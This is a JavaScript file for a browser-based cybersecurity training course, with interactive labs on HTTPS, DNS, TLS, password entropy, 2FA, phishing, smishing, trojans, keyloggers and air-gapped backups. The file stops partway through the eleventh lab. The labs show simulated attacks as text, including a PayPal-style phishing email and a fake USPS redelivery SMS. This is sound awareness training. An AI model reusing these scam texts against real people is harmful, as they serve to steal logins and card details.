// CyberZero — Interactive Lab Engine (labs.js)
// All 22 module labs with real computation, animated visuals, and cause-and-effect interactions.

function renderLab(modId) {
  const controls = document.getElementById('lab-controls');
  const output   = document.getElementById('sim-output');
  const hint     = document.getElementById('lab-hint');
  if (!controls) return;
  controls.innerHTML = '';
  if (output)  { output.className = 'sim-output'; output.innerHTML = ''; }

  const mod = CURRICULUM.find(m => m.id === modId);
  if (mod && hint) {
    hint.style.display = 'block';
    hint.innerHTML = `💡 <b>Lab Hint:</b> ${mod.hint}`;
  }

  const L = {
    html: (h) => { controls.innerHTML = h; },
    out: (msg, type = '') => {
      if (!output) return;
      output.className = `sim-output show${type ? ' ' + type : ''}`;
      output.innerHTML = msg;
    }
  };

  switch (modId) {
    case 1:  lab_wifi(L); break;
    case 2:  lab_dns(L);  break;
    case 3:  lab_tls(L);  break;
    case 4:  lab_ethics(L); break;
    case 5:  lab_entropy(L); break;
    case 6:  lab_totp(L); break;
    case 7:  lab_phish(L); break;
    case 8:  lab_smish(L); break;
    case 9:  lab_trojan(L); break;
    case 10: lab_keylogger(L); break;
    case 11: lab_airgap(L); break;
    case 12: lab_sandbox(L); break;
    case 13: lab_eviltwin(L); break;
    case 14: lab_vpn(L); break;
    case 15: lab_firewall(L); break;
    case 16: lab_sqli(L); break;
    case 17: lab_xss(L); break;
    case 18: lab_sha256(L); break;
    case 19: lab_ddos(L); break;
    case 20: lab_zerodday(L); break;
    case 21: lab_forensics(L); break;
    case 22: lab_citadel(L); break;
    default: controls.innerHTML = '<p style="color:var(--c-text-dim)">Lab not found.</p>';
  }
}

/* ── LAB 1: Wi-Fi Packet Intercept ───────────────────────────── */
function lab_wifi(L) {
  L.html(`
    <div class="col">
      <div style="display:flex; align-items:center; gap:16px; flex-wrap:wrap;">
        <div class="toggle-row" id="enc-toggle-row" onclick="lab1_toggle()" style="cursor:pointer;">
          <div class="toggle-switch" id="enc-toggle"></div>
          <span class="toggle-label">HTTPS Encryption Shield</span>
        </div>
        <button class="btn btn-primary" onclick="lab1_capture()">📡 Capture Packets</button>
      </div>
      <div style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px; font-family:var(--font-code); font-size:0.82rem; line-height:1.6;">
        <div style="color:var(--c-text-dim); margin-bottom:8px; font-size:0.75rem; text-transform:uppercase; letter-spacing:1px;">📡 Live Packet Stream — Coffee Shop Wi-Fi</div>
        <div id="packet-stream">Click "Capture Packets" to start...</div>
      </div>
    </div>
  `);
  window.lab1EncOn = false;

  window.lab1_toggle = () => {
    window.lab1EncOn = !window.lab1EncOn;
    const t = document.getElementById('enc-toggle');
    if (t) t.className = `toggle-switch ${window.lab1EncOn ? 'on' : ''}`;
    playSound(window.lab1EncOn ? 'success' : 'click');
  };

  window.lab1_capture = () => {
    const stream = document.getElementById('packet-stream');
    const enc = window.lab1EncOn;
    playSound(enc ? 'success' : 'error');

    const packets = enc ? [
      `<span style="color:var(--c-green)">[+] Packet #1  →  POST https://bank.com/login</span>`,
      `<span style="color:var(--c-green)">[+] Payload: TLSv1.3 Encrypted  [AES-256-GCM]</span>`,
      `<span style="color:var(--c-green)">[+] Content: ████████████████ [CIPHERTEXT — UNREADABLE]</span>`,
      `<span style="color:var(--c-green)">[✓] Eavesdropper sees: ZERO readable data. Steel padlock held.</span>`,
    ] : [
      `<span style="color:var(--c-red)">[!] Packet #1  →  POST http://bank.com/login</span>`,
      `<span style="color:var(--c-red)">[!] Protocol: HTTP/1.1 (NO ENCRYPTION)</span>`,
      `<span style="color:var(--c-red)">[!] Payload INTERCEPTED: username=john_doe&password=s3cretPa55!</span>`,
      `<span style="color:var(--c-red)">[✗] STOLEN: Anyone on this Wi-Fi just captured your credentials!</span>`,
    ];
    stream.innerHTML = packets.join('<br>');

    const type = enc ? 'ok' : 'err';
    const out = document.getElementById('sim-output');
    if (out) {
      out.className = `sim-output show ${type}`;
      out.innerHTML = enc
        ? `✅ HTTPS ACTIVE: TLS 1.3 tunnel established. AES-256-GCM encrypts all packets. Interceptors see solid ciphertext.\nGo to the Quiz tab and answer correctly to unlock your badge!`
        : `🚨 HTTP EXPOSED: Password captured in plain text! Toggle the HTTPS Shield ON to encrypt traffic.`;
    }
  };
}

/* ── LAB 2: DNS Resolver ─────────────────────────────────────── */
function lab_dns(L) {
  const fakeIPs = { 'google.com':'142.250.190.46', 'youtube.com':'142.250.72.14', 'netflix.com':'52.5.14.139', 'amazon.com':'54.239.28.85', 'github.com':'140.82.112.3', 'openai.com':'104.18.33.45' };
  L.html(`
    <div class="col">
      <div class="row">
        <input class="input" id="dns-in" type="text" value="youtube.com" placeholder="Enter domain (e.g. youtube.com)" style="max-width:280px;">
        <button class="btn btn-primary" onclick="lab2_resolve()">📖 Resolve DNS</button>
      </div>
      <div style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px; font-family:var(--font-code); font-size:0.85rem; line-height:2;">
        <div id="dns-chain">Enter a domain and click Resolve to trace the DNS lookup chain.</div>
      </div>
    </div>
  `);

  window.lab2_resolve = () => {
    const domain = (document.getElementById('dns-in').value || 'youtube.com').trim().toLowerCase();
    const ip = fakeIPs[domain] || `${Math.floor(104+Math.random()*40)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
    const tld = domain.split('.').pop();
    playSound('click');

    const chain = document.getElementById('dns-chain');
    chain.innerHTML = `
      <div style="color:var(--c-text-dim)">$ nslookup ${domain}</div>
      <div style="color:var(--c-yellow)">→ Your OS checks local cache... <span style="color:var(--c-red)">CACHE MISS</span></div>
      <div style="color:var(--c-cyan)">→ Querying Root DNS Server (a.root-servers.net)...</div>
      <div style="color:var(--c-cyan)">→ Root Server: "Ask the .${tld} TLD server at 192.5.6.30"</div>
      <div style="color:var(--c-purple)">→ Querying .${tld} TLD Server (192.5.6.30)...</div>
      <div style="color:var(--c-purple)">→ TLD Server: "Ask authoritative NS for ${domain}"</div>
      <div style="color:var(--c-green)">→ Querying Authoritative Name Server...</div>
      <div style="color:var(--c-green)">→ <b>Answer: ${domain} → ${ip}</b></div>
      <div style="color:var(--c-text-dim)">→ Result cached for 300s (TTL). Browser connecting to ${ip}...</div>
    `;

    const out = document.getElementById('sim-output');
    if (out) {
      out.className = 'sim-output show ok';
      out.innerHTML = `✅ DNS RESOLVED: ${domain} → IP: ${ip}\nYour browser now has the GPS coordinate to route traffic directly to the correct server.`;
    }
  };
}

/* ── LAB 3: TLS Handshake ────────────────────────────────────── */
function lab_tls(L) {
  L.html(`
    <div class="col">
      <div style="display:flex; align-items:center; gap:16px; flex-wrap:wrap;">
        <div class="toggle-row" id="tls-toggle-row" onclick="lab3_toggle()" style="cursor:pointer;">
          <div class="toggle-switch" id="tls-toggle"></div>
          <span class="toggle-label">SSL/TLS Encryption Armor</span>
        </div>
        <button class="btn btn-primary" onclick="lab3_send()">📨 Send Message</button>
      </div>
      <div id="tls-steps" style="display:none; background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px; font-family:var(--font-code); font-size:0.82rem; line-height:1.8; color:var(--c-text-dim);">
        TLS handshake steps will appear here...
      </div>
    </div>
  `);
  window.lab3On = false;

  window.lab3_toggle = () => {
    window.lab3On = !window.lab3On;
    const t = document.getElementById('tls-toggle');
    if (t) t.className = `toggle-switch ${window.lab3On ? 'on' : ''}`;
    playSound(window.lab3On ? 'success' : 'click');
    const steps = document.getElementById('tls-steps');
    if (steps) steps.style.display = window.lab3On ? 'block' : 'none';
    if (window.lab3On && steps) {
      steps.innerHTML = `
        <div style="color:var(--c-cyan)">Step 1 → ClientHello: Browser sends supported TLS versions + cipher suites</div>
        <div style="color:var(--c-cyan)">Step 2 → ServerHello: Server selects TLS 1.3 + ECDHE_RSA_AES_256_GCM_SHA384</div>
        <div style="color:var(--c-yellow)">Step 3 → Certificate: Server sends RSA-4096 signed by DigiCert CA</div>
        <div style="color:var(--c-yellow)">Step 4 → Browser verifies certificate chain → Valid ✅</div>
        <div style="color:var(--c-green)">Step 5 → Key Exchange: ECDHE Diffie-Hellman generates ephemeral session key</div>
        <div style="color:var(--c-green)">Step 6 → Finished: Both sides derive identical AES-256-GCM session keys</div>
        <div style="color:var(--c-green)">Step 7 → All subsequent data: AES-256-GCM encrypted 🔒</div>
      `;
    }
  };

  window.lab3_send = () => {
    playSound(window.lab3On ? 'success' : 'error');
    const out = document.getElementById('sim-output');
    if (!out) return;
    out.className = `sim-output show ${window.lab3On ? 'ok' : 'err'}`;
    out.innerHTML = window.lab3On
      ? `✅ TLS 1.3 ENCRYPTED TRANSMISSION:\nPlaintext: "My bank password is: Alpine$2026!"\nEncrypted: 8f3ac091e4b2d7... [AES-256-GCM — 256-bit key — unbreakable by current computing]\nInterceptor captures: ████████████████████ [UNREADABLE CIPHERTEXT]`
      : `🚨 PLAIN HTTP TRANSMISSION INTERCEPTED!\nPlaintext: "My bank password is: Alpine$2026!"\nWireshark capture: POST /login HTTP/1.1 | password=Alpine$2026!\n⚠️ Every router between you and the server just saw this!`;
  };
}

/* ── LAB 4: Ethics Contracts ──────────────────────────────────── */
function lab_ethics(L) {
  L.html(`
    <div class="col" style="gap:14px;">
      <div style="background:var(--c-surface-2); border:1px solid var(--c-border); border-radius:var(--r-lg); padding:18px;">
        <div style="font-weight:700; margin-bottom:8px;">📄 Contract A — First National Bank</div>
        <div style="font-size:0.88rem; color:var(--c-text-dim);">The CISO of First National Bank requests a full external penetration test on web portals. Signed Statement of Work attached. Scope: banking.firstnational.com only. Duration: 3 days.</div>
        <div class="row" style="margin-top:14px; flex-wrap:wrap;">
          <button class="btn btn-success btn-sm" onclick="lab4_act('A','accept')">✅ Accept White Hat Contract</button>
          <button class="btn btn-ghost btn-sm" onclick="lab4_act('A','reject')">✗ Decline</button>
        </div>
      </div>
      <div style="background:var(--c-surface-2); border:1px solid rgba(244,63,94,0.3); border-radius:var(--r-lg); padding:18px;">
        <div style="font-weight:700; margin-bottom:8px; color:var(--c-red);">⚠️ Contract B — Anonymous Forum</div>
        <div style="font-size:0.88rem; color:var(--c-text-dim);">User 'd4rkn3t_h4ck3r' offers $500 cash via Telegram to "test" an ex-partner's email account. No written agreement. No system owner authorization. "Just get the login."</div>
        <div class="row" style="margin-top:14px; flex-wrap:wrap;">
          <button class="btn btn-danger btn-sm" onclick="lab4_act('B','report')">🚨 Report to Cybercrime Authority</button>
          <button class="btn btn-ghost btn-sm" onclick="lab4_act('B','accept')">Accept $500</button>
        </div>
      </div>
    </div>
  `);

  window.lab4_act = (contract, action) => {
    const out = document.getElementById('sim-output');
    if (!out) return;
    playSound((contract === 'A' && action === 'accept') || (contract === 'B' && action === 'report') ? 'success' : 'error');

    if (contract === 'A' && action === 'accept') {
      out.className = 'sim-output show ok';
      out.innerHTML = `✅ WHITE HAT CONTRACT ACCEPTED!\nAuthorization verified: Signed SoW from CISO (authorized system owner).\nScope defined: banking.firstnational.com only.\nRules of Engagement document signed.\nYou are legally protected and operating ethically.`;
    } else if (contract === 'B' && action === 'report') {
      out.className = 'sim-output show ok';
      out.innerHTML = `✅ CRIMINAL REQUEST REPORTED!\nYou refused unauthorized access and reported to the IC3 (Internet Crime Complaint Center).\nThis IS the correct ethical response. Unauthorized access is federal crime regardless of payment offered.`;
    } else if (contract === 'B' && action === 'accept') {
      out.className = 'sim-output show err';
      out.innerHTML = `🚨 CRIMINAL VIOLATION — Computer Fraud and Abuse Act (18 U.S.C. § 1030)\nYou accepted an unauthorized hacking request. No written authorization from system owner.\nConsequences: Federal criminal charges, up to 10 years imprisonment, $250,000 fine.\n$500 is not worth a federal conviction.`;
    } else {
      out.className = 'sim-output show info';
      out.innerHTML = `Contract A declined. Always evaluate whether you WANT the job too — not just whether it's legal.`;
    }
  };
}

/* ── LAB 5: Password Entropy Calculator ──────────────────────── */
function lab_entropy(L) {
  L.html(`
    <div class="col">
      <input class="input" id="pwd-in" type="text" placeholder="Type any password to calculate entropy..." oninput="lab5_calc()">
      <div style="display:flex; gap:12px; align-items:center; flex-wrap:wrap;">
        <div id="entropy-bits" style="font-family:var(--font-code); font-size:1.1rem; font-weight:700; color:var(--c-cyan);">Entropy: — bits</div>
        <div id="charset-info" style="font-size:0.82rem; color:var(--c-text-dim);"></div>
      </div>
      <div style="background:var(--c-surface-2); border-radius:var(--r-lg); overflow:hidden; border:1px solid var(--c-border); height:12px;">
        <div id="strength-bar" style="height:100%; width:0%; background:var(--c-red); transition:all 0.4s ease; border-radius:var(--r-full);"></div>
      </div>
      <div id="crack-time" style="font-family:var(--font-code); font-size:0.95rem; color:var(--c-text-dim);">Estimated GPU cracking time: —</div>
    </div>
  `);

  window.lab5_calc = () => {
    const pwd = document.getElementById('pwd-in').value;
    let charsetSize = 0;
    if (/[a-z]/.test(pwd)) charsetSize += 26;
    if (/[A-Z]/.test(pwd)) charsetSize += 26;
    if (/[0-9]/.test(pwd)) charsetSize += 10;
    if (/[^a-zA-Z0-9]/.test(pwd)) charsetSize += 33;
    if (charsetSize === 0) charsetSize = 26;

    const entropy = pwd.length > 0 ? Math.log2(Math.pow(charsetSize, pwd.length)) : 0;
    const hashesPerSec = 1e10; // 10 billion SHA-256/sec for top GPU cluster
    const timeSeconds = Math.pow(2, entropy - 1) / hashesPerSec;

    let timeStr;
    if      (timeSeconds < 1)              timeStr = `< 1 second 🚨`;
    else if (timeSeconds < 60)             timeStr = `${timeSeconds.toFixed(1)} seconds 🚨`;
    else if (timeSeconds < 3600)           timeStr = `${(timeSeconds/60).toFixed(1)} minutes ⚠️`;
    else if (timeSeconds < 86400)          timeStr = `${(timeSeconds/3600).toFixed(1)} hours ⚠️`;
    else if (timeSeconds < 31536000)       timeStr = `${(timeSeconds/86400).toFixed(0)} days ⚠️`;
    else if (timeSeconds < 3.15e9)         timeStr = `${(timeSeconds/31536000).toFixed(0)} years 🟡`;
    else if (timeSeconds < 3.15e15)        timeStr = `${(timeSeconds/3.15e9).toFixed(0)} thousand years ✅`;
    else if (timeSeconds < 3.15e24)        timeStr = `Millions of years ✅`;
    else                                   timeStr = `> Age of Universe (13.8B years) ✅✅✅ TITANIUM VAULT!`;

    const bitsEl = document.getElementById('entropy-bits');
    const barEl  = document.getElementById('strength-bar');
    const crackEl = document.getElementById('crack-time');
    const charEl = document.getElementById('charset-info');

    if (bitsEl) bitsEl.innerHTML = `Entropy: <b style="color:var(--c-cyan)">${entropy.toFixed(1)} bits</b>`;
    if (charEl) charEl.textContent = `Charset: ${charsetSize} chars | Length: ${pwd.length}`;
    if (crackEl) crackEl.innerHTML = `⏱️ GPU Cracking Time (10B hash/s): <b>${timeStr}</b>`;

    const pct = Math.min(100, (entropy / 120) * 100);
    const color = entropy < 30 ? 'var(--c-red)' : entropy < 60 ? 'var(--c-yellow)' : entropy < 90 ? 'var(--c-cyan)' : 'var(--c-green)';
    if (barEl) { barEl.style.width = pct + '%'; barEl.style.background = color; }

    const out = document.getElementById('sim-output');
    if (out) {
      out.className = entropy >= 80 ? 'sim-output show ok' : entropy >= 40 ? 'sim-output show' : 'sim-output show err';
      out.innerHTML = entropy >= 80
        ? `✅ TITANIUM VAULT PASSWORD! ${entropy.toFixed(0)} bits of entropy. This password would outlast all computing power on Earth.`
        : entropy >= 40
        ? `⚠️ MODERATE STRENGTH: ${entropy.toFixed(0)} bits. Add uppercase letters, numbers, and symbols to push past 80 bits.`
        : `🚨 WEAK PASSWORD: Only ${entropy.toFixed(0)} bits of entropy. A modern GPU can crack this in moments.`;
    }
  };
}

/* ── LAB 6: TOTP 2FA ─────────────────────────────────────────── */
function lab_totp(L) {
  L.html(`
    <div class="col">
      <div style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:20px; text-align:center;">
        <div style="font-size:0.75rem; color:var(--c-text-dim); text-transform:uppercase; letter-spacing:1px; margin-bottom:8px;">📱 Your Authenticator App — Live TOTP Code</div>
        <div id="totp-code" style="font-family:var(--font-code); font-size:2.5rem; font-weight:800; color:var(--c-cyan); letter-spacing:10px;">— — —</div>
        <div style="margin-top:12px; display:flex; align-items:center; gap:8px; justify-content:center;">
          <div id="totp-bar-bg" style="flex:1; max-width:200px; height:4px; background:var(--c-surface-3); border-radius:var(--r-full); overflow:hidden;">
            <div id="totp-bar" style="height:100%; background:var(--c-cyan); border-radius:var(--r-full); transition:width 1s linear;"></div>
          </div>
          <span id="totp-timer" style="font-family:var(--font-code); font-size:0.85rem; color:var(--c-text-dim);">30s</span>
        </div>
      </div>
      <div class="row" style="flex-wrap:wrap;">
        <input class="input" id="totp-in" type="text" placeholder="Enter the 6-digit code..." style="max-width:240px;" maxlength="8">
        <button class="btn btn-success" onclick="lab6_verify()">Verify 2FA Token</button>
      </div>
    </div>
  `);
  initTOTP();
}

function initTOTP() {
  if (!window.totpCode) {
    window.totpCode = String(Math.floor(100000 + Math.random() * 900000));
    window.totpSecsLeft = 30;
  }
  const codeEl  = document.getElementById('totp-code');
  const timerEl = document.getElementById('totp-timer');
  const barEl   = document.getElementById('totp-bar');
  if (codeEl) codeEl.textContent = window.totpCode.replace(/(\d{3})(\d{3})/, '$1 $2');
  if (timerEl) timerEl.textContent = `${window.totpSecsLeft}s`;
  if (barEl) barEl.style.width = `${(window.totpSecsLeft/30)*100}%`;

  clearInterval(window.totpInterval);
  window.totpInterval = setInterval(() => {
    window.totpSecsLeft--;
    if (window.totpSecsLeft <= 0) {
      window.totpCode = String(Math.floor(100000 + Math.random() * 900000));
      window.totpSecsLeft = 30;
    }
    const c = document.getElementById('totp-code');
    const t = document.getElementById('totp-timer');
    const b = document.getElementById('totp-bar');
    if (c) c.textContent = window.totpCode.replace(/(\d{3})(\d{3})/, '$1 $2');
    if (t) t.textContent = `${window.totpSecsLeft}s`;
    if (b) b.style.width = `${(window.totpSecsLeft/30)*100}%`;
  }, 1000);
}

window.lab6_verify = () => {
  const val = (document.getElementById('totp-in').value || '').replace(/\s/g,'');
  const out = document.getElementById('sim-output');
  const match = val === window.totpCode;
  playSound(match ? 'success' : 'error');
  if (out) {
    out.className = `sim-output show ${match ? 'ok' : 'err'}`;
    out.innerHTML = match
      ? `✅ 2FA TOKEN VERIFIED! Access granted.\nThe server computed HMAC-SHA1(shared_secret || floor(time/30)) and got ${window.totpCode}. They matched!`
      : `❌ INVALID TOKEN! Even if an attacker knows your password, they cannot log in without the current TOTP code from your physical phone.`;
  }
};

/* ── LAB 7: Phishing Detector ────────────────────────────────── */
function lab_phish(L) {
  L.html(`
    <div class="col">
      <div style="background:#030810; border:2px solid var(--c-border); border-radius:var(--r-lg); padding:20px; font-size:0.92rem; line-height:1.8;">
        <div style="font-size:0.75rem; color:var(--c-text-dim); text-transform:uppercase; letter-spacing:1px; margin-bottom:12px;">📧 Incoming Email — Inspect Carefully</div>
        <div><b>From:</b> <span style="color:var(--c-red); font-family:var(--font-code);">PayPal Security &lt;support@paypal-security-alert-notice.com&gt;</span></div>
        <div><b>To:</b> you@email.com</div>
        <div><b>Subject:</b> <span style="color:var(--c-yellow);">🚨 URGENT: Your account is suspended — verify immediately!</span></div>
        <hr style="border-color:var(--c-border); margin:12px 0;">
        <p>Dear Valued Customer,<br><br>
        We detected suspicious activity on your PayPal account. Your account has been <b>temporarily suspended</b> and will be permanently closed within <b>24 HOURS</b> unless you verify your information immediately.<br><br>
        <span style="color:var(--c-cyan); text-decoration:underline; cursor:pointer;">Click here to verify your account now &rarr;</span><br><br>
        PayPal Security Team</p>
      </div>
      <div class="row" style="flex-wrap:wrap;">
        <button class="btn btn-danger" onclick="lab7_act(true)">🚨 Report as Phishing</button>
        <button class="btn btn-success" onclick="lab7_act(false)">✅ Mark as Legitimate</button>
      </div>
    </div>
  `);

  window.lab7_act = (isPhish) => {
    const out = document.getElementById('sim-output');
    playSound(isPhish ? 'success' : 'error');
    if (out) {
      out.className = `sim-output show ${isPhish ? 'ok' : 'err'}`;
      out.innerHTML = isPhish
        ? `✅ PHISHING CORRECTLY IDENTIFIED!\nRed Flags:\n1. Sender: @paypal-security-alert-notice.com (NOT @paypal.com)\n2. Urgency: "24 HOURS" — classic pressure tactic\n3. Vague greeting: "Dear Valued Customer" (not your name)\n4. Link destination: suspicious domain (never click without hovering first)`
        : `🚨 PHISHING HOOK BITTEN!\nYou marked a scam email as legitimate! The sender domain is 'paypal-security-alert-notice.com' — NOT paypal.com. Real PayPal emails come ONLY from @paypal.com. Never click links in suspicious emails.`;
    }
  };
}

/* ── LAB 8: Smishing ─────────────────────────────────────────── */
function lab_smish(L) {
  L.html(`
    <div class="col">
      <div style="background:#030810; border:2px solid var(--c-border); border-radius:var(--r-lg); padding:20px; max-width:400px;">
        <div style="font-size:0.75rem; color:var(--c-text-dim); margin-bottom:12px; text-transform:uppercase; letter-spacing:1px;">📱 Incoming SMS Message</div>
        <div style="background:rgba(59,130,246,0.1); border-radius:10px; padding:14px; font-size:0.9rem; line-height:1.6; color:var(--c-text);">
          <b>USPS:</b> Your package #US844229 requires a $1.99 redelivery fee. Pay now to avoid return: 
          <span style="color:var(--c-red); font-family:var(--font-code); font-size:0.82rem;">http://usps-parcel-redelivery-fee.com</span><br>
          <span style="font-size:0.78rem; color:var(--c-text-dim);">Reply STOP to unsubscribe</span>
        </div>
      </div>
      <div class="row" style="flex-wrap:wrap;">
        <button class="btn btn-danger" onclick="lab8_act(true)">🚨 Block & Delete Scam</button>
        <button class="btn btn-primary" onclick="lab8_act(false)">💳 Pay $1.99 Fee</button>
      </div>
    </div>
  `);

  window.lab8_act = (correct) => {
    const out = document.getElementById('sim-output');
    playSound(correct ? 'success' : 'error');
    if (out) {
      out.className = `sim-output show ${correct ? 'ok' : 'err'}`;
      out.innerHTML = correct
        ? `✅ SMISHING TRAP NEUTRALIZED!\nRed Flags:\n1. USPS never requests payment via SMS link\n2. Domain "usps-parcel-redelivery-fee.com" is NOT usps.com\n3. The tiny $1.99 fee is psychological — they want your full card number\n4. Real delivery issues are resolved at usps.com directly`
        : `🚨 CARD DETAILS STOLEN!\nYou entered your card details on a fake USPS site.\nThe scammer now has: Card number + Expiry + CVV = Full card access.\nThey will charge thousands of dollars within hours.`;
    }
  };
}

/* ── LAB 9: Trojan Triage ────────────────────────────────────── */
function lab_trojan(L) {
  L.html(`
    <div class="col">
      <div style="font-size:0.85rem; color:var(--c-text-dim); margin-bottom:4px;">Downloads quarantine queue — analyze each file:</div>
      <div class="col" style="gap:10px;">
        ${[
          { name:'bank_statement_Q2_2026.pdf', type:'PDF', signed:'DigiCert', vt:'0/72', risk:'safe' },
          { name:'free_fortnite_skins_unlock.exe', type:'EXE', signed:'UNSIGNED', vt:'58/72', risk:'trojan' },
          { name:'adobe_acrobat_update.exe', type:'EXE', signed:'Adobe Systems', vt:'0/72', risk:'safe' },
        ].map(f => `
          <div style="background:var(--c-surface-2); border:1px solid ${f.risk==='trojan'?'rgba(244,63,94,0.4)':'var(--c-border)'}; border-radius:var(--r-lg); padding:14px;">
            <div class="row" style="justify-content:space-between; flex-wrap:wrap; gap:8px;">
              <div>
                <div style="font-weight:700; font-family:var(--font-code); font-size:0.88rem; color:${f.risk==='trojan'?'var(--c-red)':'var(--c-text)'};">${f.name}</div>
                <div style="font-size:0.78rem; color:var(--c-text-dim); margin-top:4px;">Type: ${f.type} | Signed: ${f.signed} | VirusTotal: <b style="color:${parseInt(f.vt)>0?'var(--c-red)':'var(--c-green)'}">${f.vt} detections</b></div>
              </div>
              <button class="btn btn-sm ${f.risk==='trojan'?'btn-danger':'btn-success'}" onclick="lab9_act('${f.risk}','${f.name}')">${f.risk==='trojan'?'🚨 Quarantine':'✅ Allow'}</button>
            </div>
          </div>
        `).join('')}
      </div>
    </div>
  `);

  window.lab9_act = (risk, name) => {
    const out = document.getElementById('sim-output');
    playSound(risk === 'trojan' ? 'success' : 'click');
    if (out) {
      out.className = `sim-output show ${risk === 'trojan' ? 'ok' : 'info'}`;
      out.innerHTML = risk === 'trojan'
        ? `✅ TROJAN QUARANTINED: "${name}"\nAnalysis: 58/72 antivirus engines flagged as Trojan.GenericKD\nPayload: Drops keylogger + C2 beacon to 185.220.101.5\nVector: Free game cheat — disguised as legitimate utility\nThreat neutralized before execution!`
        : `ℹ️ File "${name}" verified safe — digital signature authentic, zero VirusTotal detections.`;
    }
  };
}

/* ── LAB 10: Keylogger ────────────────────────────────────────── */
function lab_keylogger(L) {
  L.html(`
    <div class="col">
      <div style="background:#030810; border:1px solid var(--c-border); border-radius:var(--r-lg); padding:16px; font-family:var(--font-code); font-size:0.85rem;">
        <div style="color:var(--c-text-dim); font-size:0.72rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:8px;">🔴 Active Keylogger Capture Log</div>
        <div id="kl-log" style="color:var(--c-red); min-height:60px;">[WAITING FOR KEYSTROKES...]</div>
      </div>
      <div style="font-size:0.88rem; font-weight:700; color:var(--c-text-dim);">Option A — Physical Keyboard (Vulnerable)</div>
      <input class="input" id="kl-phys-in" type="text" placeholder="Type your password with physical keyboard..." oninput="lab10_phys(this.value)">
      <div style="font-size:0.88rem; font-weight:700; color:var(--c-text-dim);">Option B — Virtual Mouse Keyboard (Keylogger-Resistant)</div>
      <div style="display:flex; gap:6px; flex-wrap:wrap;" id="vkb">
        ${'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.split('').map(c => `<button class="btn btn-secondary btn-sm" style="padding:8px 10px; font-family:var(--font-code);" onclick="lab10_vkb('${c}')">${c}</button>`).join('')}
        <button class="btn btn-ghost btn-sm" onclick="lab10_vkb('⌫')">⌫</button>
      </div>
      <div id="vkb-display" style="font-family:var(--font-code); font-size:1rem; color:var(--c-green); min-height:30px;"></div>
    </div>
  `);
  window.vkbStr = '';

  window.lab10_phys = (val) => {
    const log = document.getElementById('kl-log');
    const out = document.getElementById('sim-output');
    if (log) log.innerHTML = val.split('').map(c => `<span>[KEY: ${c}]</span>`).join(' ');
    playSound('error');
    if (out) {
      out.className = 'sim-output show err';
      out.innerHTML = `🚨 KEYLOGGER CAPTURING: SetWindowsHookEx hook active!\nIntercepted keystrokes: "${val}"\nSent to C2 server: 185.220.101.5:443`;
    }
  };

  window.lab10_vkb = (key) => {
    const log = document.getElementById('kl-log');
    const disp = document.getElementById('vkb-display');
    const out = document.getElementById('sim-output');
    if (key === '⌫') window.vkbStr = window.vkbStr.slice(0,-1);
    else window.vkbStr += key;
    if (log) log.innerHTML = `<span style="color:var(--c-green)">[VIRTUAL KEYBOARD — NO WM_KEYDOWN EVENTS — LOGGER BLIND]</span>`;
    if (disp) disp.textContent = window.vkbStr;
    playSound('click');
    if (out) {
      out.className = 'sim-output show ok';
      out.innerHTML = `✅ VIRTUAL KEYBOARD BYPASS ACTIVE!\nMouse clicks → WM_LBUTTONDOWN events (different API path)\nKeylogger hook: SetWindowsHookEx(WH_KEYBOARD_LL) captures NOTHING\nCapture log: [EMPTY] — your input is invisible to the logger!`;
    }
  };
}

/* ── LAB 11: Air-Gap ─────────────────────────────────────────── */
function lab_airgap(L) {
  L.html(`
    <div class="col">
      <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:12px;" id="drive-grid">
        ${[
          { id:'d-c', label:'💾 Drive C:\\', type:'system', status:'online', connected:true },
          { id:'d-d', label:'📁 Drive D:\\ (Data)', type:'data', status:'online', connected:true },
          { id:'d-net', label:'🌐 NAS Backup', type:'network', status:'online', connected:true },
          { id:'d-usb', label:'🔌 USB Air-Gap', type:'airgap', status:'OFFLINE (UNPLUGGED)', connected:false },
        ].map(d => `
          <div id="${d.id}" style="background:var(--c-surface-2); border:2px solid ${d.connected?'var(--c-green)':'var(--c-border)'}; border-radius:var(--r-lg); padding:16px; text-align:center;">
            <div style="font-size:1.8rem;">${d.label.split(' ')[0]}</div>
            <div style="font-size:0.82rem; font-weight:700; margin-top:6px; color:var(--c-text);">${d.label.slice(d.label.indexOf(' ')+1)}</div>
            <div id="${d.id}-status" style="font-size:0.72rem; margin-top:4px; color:${d.connected?'var(--c-green)':'var(--c-text-dim)'};">${d.status}</div>
          </div>
        `).join('')}
      </div>
      <div class="row" style="flex-wrap:wrap;">
        <button class="btn btn-danger" onclick="lab11_bomb()">💥 Detonate Ransomware</button>
        <button class="btn btn-success" onclick="lab11_restore()">💾 Restore from Air-Gap</button>
      </div>
    </div>
  `);

  window.lab11_bomb = () => {
    ['d-c','d-d','d-net'].forEach(id => {
      const el = document.getElementById(id);
      const st = document.getElementById(id+'-status');
      if (el) el.style.borderColor = 'var(--c-red)';
      if (st) { st.textContent = '🔒 ENCRYPTED BY RANSOMWARE'; st.style.color = 'var(--c-red)'; }
    });
    const usb = document.getElementById('d-usb-status');
    if (usb) { usb.textContent = '✅ UNTOUCHED — NO NETWORK PATH'; usb.style.color = 'var(--c-green)'; }
    playSound('error');
    const out = document.getElementById('sim-output');
    if (out) {
      out.className = 'sim-output show err';
      out.innerHTML = `💥 RANSOMWARE DETONATED!\nDrive C:\\ → ENCRYPTED | Drive D:\\ → ENCRYPTED | NAS Backup → ENCRYPTED\n\n✅ USB Air-Gap → UNTOUCHED (physically disconnected = no network path)\n\nThe ransomware traversed every connected network path. Only the air-gapped USB survived.`;
    }
  };

  window.lab11_restore = () => {
    ['d-c','d-d','d-net'].forEach(id => {
      const el = document.getElementById(id);
      const st = document.getElementById(id+'-status');
      if (el) el.style.borderColor = 'var(--c-green)';
      if (st) { st.textContent = '✅ Restored from backup'; st.style.color = 'var(--c-green)'; }
    });
    playSound('success');
    const out = document.getElementById('sim-output');
    if (out) {
      out.className = 'sim-output show ok';
